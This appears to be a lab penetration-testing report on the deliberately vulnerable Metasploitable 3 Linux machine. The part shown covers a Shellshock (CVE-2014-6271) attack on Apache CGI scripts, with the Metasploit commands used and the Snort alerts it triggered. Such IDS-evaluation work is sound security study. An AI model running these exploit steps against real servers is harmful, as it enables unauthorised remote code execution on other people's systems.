# Penetration Testing Report on Metasploitable 3 (Linux)

## Introduction

This report details the penetration testing performed on the [Metasploitable 3 (Linux)](https://github.com/rapid7/metasploitable3) operating system using [Metasploit](https://www.metasploit.com/). Five different attacks were carried out, with three being identifiable by the [Snort](https://www.snort.org/) Intrusion Detection System (IDS) and two going undetected. The report provides a brief description of each attack, including the targeted component, execution method, and Snort output for detected attacks. Additionally, it includes an essay on the benefits and shortcomings of using intrusion detection systems.

## IDENTIFIED ATTACK 1: Apache HTTP Server RCE

### Description

**Component Targeted:** Shellshock Bash Vulnerability / Apache web server with CGI scripts

**Execution Method:** This attack exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. It targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition. [CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)

**Steps in Metasploit:**
1. Select the exploit: `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
2. Set the target IP: `set RHOST <target_ip>`
3. Set the target URI: `set TARGETURI /cgi-bin/hello_world.sh`
4. Execute the attack: `run`

**Snort Output:**
```
[**] [1:2025869:2] ET WEB_SPECIFIC_APPS ELF file magic plain Inbound Web Servers Likely Command Execution 12 [**] [Classification: Attempted User Privilege Gain]          [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80      
[**] [1:1336:5] WEB-ATTACKS chmod command attempt [**]                                                            [Classification: Web Application Attack]                 [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80                                                                            
[**] [1:100000122:1] COMMUNITY WEB-MISC mod_jrun overflow attempt [**]                                            [Classification: Web Application Attack]                 [Priority: 1] {TCP} 172.28.128.1:56642 -> 172.28.128.3:80                                                            
[**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**]                                              [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:56643 -> 172.28.128.3:80 
```
